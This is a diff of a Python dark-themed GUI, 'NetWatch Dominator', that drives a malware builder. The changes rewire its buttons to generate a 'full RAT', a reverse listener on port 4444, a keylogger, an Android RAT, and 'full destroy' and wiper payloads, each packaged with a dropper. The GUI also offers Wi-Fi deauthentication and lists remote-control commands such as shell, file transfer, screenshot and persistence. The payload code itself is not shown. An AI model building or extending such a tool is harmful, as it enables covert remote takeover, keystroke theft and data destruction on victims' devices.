@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Pure dark cyber GUI — NetWatch Dominator"""
+"""Dark cyber GUI — real control + destroy"""
 
 import customtkinter as ctk
 import threading
@@ -19,18 +19,17 @@ class DominatorGUI:
         self.payloads = payloads
         self.root = ctk.CTk()
         self.root.title("NetWatch Dominator")
-        self.root.geometry("1200x760")
+        self.root.geometry("1200x780")
         self.root.configure(fg_color="#0a0a0c")
         self._build()
 
     def _build(self):
-        # top bar
         top = ctk.CTkFrame(self.root, fg_color="#0f0f14", height=52, corner_radius=0)
         top.pack(fill="x")
         top.pack_propagate(False)
         ctk.CTkLabel(top, text="NETWATCH DOMINATOR", font=ctk.CTkFont(size=18, weight="bold"),
                      text_color="#00f0ff").pack(side="left", padx=16)
-        ctk.CTkLabel(top, text="● LIVE READY", text_color="#ff2a2a",
+        ctk.CTkLabel(top, text="● REAL CONTROL LAYER", text_color="#ff2a2a",
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=8)
         ctk.CTkButton(top, text="REFRESH", width=90, fg_color="#1a1a24", hover_color="#ff2a2a",
                       command=self.refresh).pack(side="right", padx=6, pady=8)
@@ -60,21 +59,17 @@ class DominatorGUI:
             ("DEAUTH", self.deauth_selected, "#1a1a24"),
             ("COPY MAC", self.copy_mac, "#1a1a24"),
         ]:
-            ctk.CTkButton(lb, text=txt, command=cmd, fg_color=col, hover_color="#cc2222",
-                          width=120).pack(side="left", padx=4)
+            ctk.CTkButton(lb, text=txt, command=cmd, fg_color=col, hover_color="#cc2222", width=120).pack(side="left", padx=4)
 
-        # HISTORY
-        self.hist_box = ctk.CTkTextbox(self.tabs.tab("History"), font=ctk.CTkFont(family="Consolas", size=12),
-                                       fg_color="#0f0f14")
+        # HISTORY / BANS same as before
+        self.hist_box = ctk.CTkTextbox(self.tabs.tab("History"), font=ctk.CTkFont(family="Consolas", size=12), fg_color="#0f0f14")
         self.hist_box.pack(fill="both", expand=True, padx=4, pady=4)
         hb = ctk.CTkFrame(self.tabs.tab("History"), fg_color="transparent")
         hb.pack(fill="x")
         ctk.CTkButton(hb, text="RELOAD", command=self.load_history, fg_color="#1a1a24").pack(side="left", padx=4)
         ctk.CTkButton(hb, text="EXPORT CSV", command=self.export_hist, fg_color="#1a1a24").pack(side="left", padx=4)
 
-        # BANS
-        self.ban_box = ctk.CTkTextbox(self.tabs.tab("Bans"), font=ctk.CTkFont(family="Consolas", size=12),
-                                      fg_color="#0f0f14")
+        self.ban_box = ctk.CTkTextbox(self.tabs.tab("Bans"), font=ctk.CTkFont(family="Consolas", size=12), fg_color="#0f0f14")
         self.ban_box.pack(fill="both", expand=True, padx=4, pady=4)
         bb = ctk.CTkFrame(self.tabs.tab("Bans"), fg_color="transparent")
         bb.pack(fill="x")
@@ -82,10 +77,10 @@ class DominatorGUI:
         ctk.CTkButton(bb, text="UNBAN", command=self.unban_selected, fg_color="#1a1a24").pack(side="left", padx=4)
         ctk.CTkButton(bb, text="EXPORT", command=self.export_bans, fg_color="#1a1a24").pack(side="left", padx=4)
 
-        # CONTROL
+        # CONTROL — real RAT
         cf = ctk.CTkFrame(self.tabs.tab("Control"), fg_color="#0f0f14")
         cf.pack(fill="both", expand=True, padx=8, pady=8)
-        ctk.CTkLabel(cf, text="CONTROL PAYLOADS — reverse shell · keylog · screen · android", 
+        ctk.CTkLabel(cf, text="REAL CONTROL — full RAT + listener + keylog + android",
                      text_color="#00f0ff", font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=6)
         row = ctk.CTkFrame(cf, fg_color="transparent")
         row.pack(fill="x", pady=4)
@@ -97,28 +92,28 @@ class DominatorGUI:
         self.lport = ctk.CTkEntry(row, width=70, fg_color="#1a1a24")
         self.lport.insert(0, "4444")
         self.lport.pack(side="left", padx=4)
-        for txt, k in [("REV SHELL", "rev"), ("KEYLOGGER", "key"), ("SCREEN", "screen"), ("ANDROID CTRL", "and_c")]:
+        for txt, k in [("FULL RAT", "rat"), ("LISTENER", "listen"), ("KEYLOGGER", "key"),
+                       ("ANDROID RAT", "and")]:
             ctk.CTkButton(row, text=txt, width=110, fg_color="#1a1a24", hover_color="#00f0ff",
                           command=lambda x=k: self.gen_control(x)).pack(side="left", padx=3)
-        self.ctrl_status = ctk.CTkLabel(cf, text="", text_color="#00f0ff")
+        self.ctrl_status = ctk.CTkLabel(cf, text="shell · file get/put · screenshot · persist · ps · sysinfo", text_color="#00f0ff")
         self.ctrl_status.pack(anchor="w", pady=4)
-        self.ctrl_list = ctk.CTkTextbox(cf, height=220, fg_color="#0a0a0c")
+        self.ctrl_list = ctk.CTkTextbox(cf, height=240, fg_color="#0a0a0c")
         self.ctrl_list.pack(fill="both", expand=True)
 
         # DESTROY
         df = ctk.CTkFrame(self.tabs.tab("Destroy"), fg_color="#0f0f14")
         df.pack(fill="both", expand=True, padx=8, pady=8)
-        ctk.CTkLabel(df, text="DESTROY PAYLOADS — crash · lock · ransom-sim · popups · android", 
+        ctk.CTkLabel(df, text="REAL DESTROY SIM — full combo · wiper · android",
                      text_color="#ff2a2a", font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=6)
         drow = ctk.CTkFrame(df, fg_color="transparent")
         drow.pack(fill="x", pady=4)
-        for txt, k in [("CRASH/BSOD", "crash"), ("SCREEN LOCK", "lock"), ("RANSOM SIM", "ransom"),
-                       ("POPUP STORM", "pop"), ("ANDROID DESTROY", "and_d")]:
-            ctk.CTkButton(drow, text=txt, width=120, fg_color="#2a0a0a", hover_color="#ff2a2a",
+        for txt, k in [("FULL DESTROY", "full"), ("WIPER SIM", "wipe"), ("ANDROID DESTROY", "and_d")]:
+            ctk.CTkButton(drow, text=txt, width=140, fg_color="#2a0a0a", hover_color="#ff2a2a",
                           command=lambda x=k: self.gen_destroy(x)).pack(side="left", padx=3)
-        self.des_status = ctk.CTkLabel(df, text="", text_color="#ff2a2a")
+        self.des_status = ctk.CTkLabel(df, text="lock + popups + mem/cpu + ransom-sim + optional BSOD", text_color="#ff2a2a")
         self.des_status.pack(anchor="w", pady=4)
-        self.des_list = ctk.CTkTextbox(df, height=220, fg_color="#0a0a0c")
+        self.des_list = ctk.CTkTextbox(df, height=240, fg_color="#0a0a0c")
         self.des_list.pack(fill="both", expand=True)
 
         # TOOLS
@@ -126,17 +121,14 @@ class DominatorGUI:
         tf.pack(fill="both", expand=True, padx=8, pady=8)
         trow = ctk.CTkFrame(tf, fg_color="transparent")
         trow.pack(fill="x", pady=6)
-        ctk.CTkButton(trow, text="Router 192.168.1.1", command=lambda: webbrowser.open("http://192.168.1.1"),
-                      fg_color="#1a1a24").pack(side="left", padx=4)
-        ctk.CTkButton(trow, text="Router 192.168.0.1", command=lambda: webbrowser.open("http://192.168.0.1"),
-                      fg_color="#1a1a24").pack(side="left", padx=4)
+        ctk.CTkButton(trow, text="Router 192.168.1.1", command=lambda: webbrowser.open("http://192.168.1.1"), fg_color="#1a1a24").pack(side="left", padx=4)
+        ctk.CTkButton(trow, text="Router 192.168.0.1", command=lambda: webbrowser.open("http://192.168.0.1"), fg_color="#1a1a24").pack(side="left", padx=4)
         ctk.CTkButton(trow, text="Local Info", command=self.show_local, fg_color="#1a1a24").pack(side="left", padx=4)
-        ctk.CTkButton(trow, text="Figma UI", command=lambda: webbrowser.open("https://www.figma.com/design/4utep1StwcVV22QmJ9pBYe"),
-                      fg_color="#1a1a24").pack(side="left", padx=4)
-        self.tools_out = ctk.CTkTextbox(tf, height=280, fg_color="#0a0a0c")
+        ctk.CTkButton(trow, text="Figma UI", command=lambda: webbrowser.open("https://www.figma.com/design/4utep1StwcVV22QmJ9pBYe"), fg_color="#1a1a24").pack(side="left", padx=4)
+        self.tools_out = ctk.CTkTextbox(tf, height=300, fg_color="#0a0a0c")
         self.tools_out.pack(fill="both", expand=True)
 
-        self.status = ctk.CTkLabel(self.root, text="ready — absolute olliE", anchor="w",
+        self.status = ctk.CTkLabel(self.root, text="ready — real control layer online", anchor="w",
                                    text_color="#666", fg_color="#0a0a0c")
         self.status.pack(fill="x", padx=12, pady=4)
 
@@ -253,18 +245,19 @@ class DominatorGUI:
         try:
             host = self.lhost.get().strip() or "127.0.0.1"
             port = int(self.lport.get().strip() or "4444")
-            if kind == "rev":
-                p = self.payloads.control_reverse_shell(host, port)
+            if kind == "rat":
+                p = self.payloads.control_full_rat(host, port)
+            elif kind == "listen":
+                p = self.payloads.control_listener(port)
             elif kind == "key":
                 p = self.payloads.control_keylogger()
-            elif kind == "screen":
-                p = self.payloads.control_screen()
-            elif kind == "and_c":
-                p = self.payloads.control_android_skeleton()
+            elif kind == "and":
+                p = self.payloads.control_android(host, port)
             else:
                 return
-            self.payloads.dropper(p)
-            self.ctrl_status.configure(text=f"generated {p.name} + dropper")
+            if kind != "listen":
+                self.payloads.dropper(p)
+            self.ctrl_status.configure(text=f"generated {p.name}")
             self.ctrl_list.delete("1.0", "end")
             for f in sorted(self.payloads.control_dir.glob("*")):
                 self.ctrl_list.insert("end", f.name + "\n")
@@ -273,16 +266,12 @@ class DominatorGUI:
 
     def gen_destroy(self, kind):
         try:
-            if kind == "crash":
-                p = self.payloads.destroy_crash()
-            elif kind == "lock":
-                p = self.payloads.destroy_lock()
-            elif kind == "ransom":
-                p = self.payloads.destroy_ransomware_sim()
-            elif kind == "pop":
-                p = self.payloads.destroy_popup_storm()
+            if kind == "full":
+                p = self.payloads.destroy_full()
+            elif kind == "wipe":
+                p = self.payloads.destroy_wiper_sim()
             elif kind == "and_d":
-                p = self.payloads.destroy_android_skeleton()
+                p = self.payloads.destroy_android()
             else:
                 return
             self.payloads.dropper(p)
@@ -300,6 +289,7 @@ class DominatorGUI:
         self.tools_out.insert("end", f"Iface   : {self.scanner.iface}\n")
         self.tools_out.insert("end", f"Bans    : {len(self.bans.list_bans())}\n")
         self.tools_out.insert("end", f"History : {len(self.history.all())}\n")
+        self.tools_out.insert("end", "\\nRAT commands: shell <cmd> | cd | pwd | ls | get <r> <l> | put <r> <l> | screenshot | ps | persist | sysinfo | kill <pid>\\n")
 
     def run(self):
         self.root.mainloop()
